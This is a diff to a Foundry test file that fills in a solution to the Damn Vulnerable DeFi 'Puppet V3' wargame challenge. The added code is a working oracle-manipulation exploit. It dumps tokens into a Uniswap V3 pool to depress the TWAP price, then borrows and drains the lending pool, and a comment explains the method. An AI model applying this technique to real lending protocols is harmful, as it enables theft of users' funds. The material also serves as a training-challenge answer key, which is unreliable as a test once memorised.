@@ -10,6 +10,8 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -115,12 +117,47 @@ contract PuppetV3Challenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
-    function test_puppetV3() public checkSolvedByPlayer {
-        
-    }
+    /*
+        The exploit takes advantage of the fact that the lending pool calculates the required deposit based on the
+        current price of the token in the Uniswap exchange. By manipulating the price of the token
+        in the Uniswap exchange through a large token swap, the attacker can significantly reduce
+        the amount of WETH required to borrow all tokens from the lending pool. This is achieved by
+        swapping a large amount of tokens for WETH, which increases the token reserve and decreases
+        the WETH reserve in the Uniswap pool, thus lowering the token price. As a result, the attacker
+        can borrow all tokens from the lending pool by depositing a much smaller amount of WETH than would
+        normally be required, effectively draining the pool.
+    */
+     function test_puppetV3() public checkSolvedByPlayer {
+     
+    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    token.approve(address(router), type(uint256).max);
+    router.exactInputSingle(
+        ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountIn: token.balanceOf(player),
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        })
+    );
+
+    skip(114 seconds);
+
+
+    weth.deposit{value: player.balance}();
+    weth.approve(address(lendingPool), type(uint).max);
+    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+
+}
+
+
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
